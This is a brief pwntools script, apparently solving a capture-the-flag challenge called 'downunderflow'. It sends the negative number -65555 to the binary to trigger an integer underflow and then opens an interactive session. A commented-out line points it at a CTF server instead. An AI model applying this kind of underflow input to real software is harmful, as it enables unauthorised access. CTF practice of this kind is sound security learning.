from pwn import *
context.log_level = 'debug'
# context.arch = "amd64"
from ctypes import *
e = context.binary = ELF('downunderflow')
r= e.process()
# r = remote('challs.n00bzunit3d.xyz', 42450)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

pause()
r.sendline(b"-65555")

r.interactive()
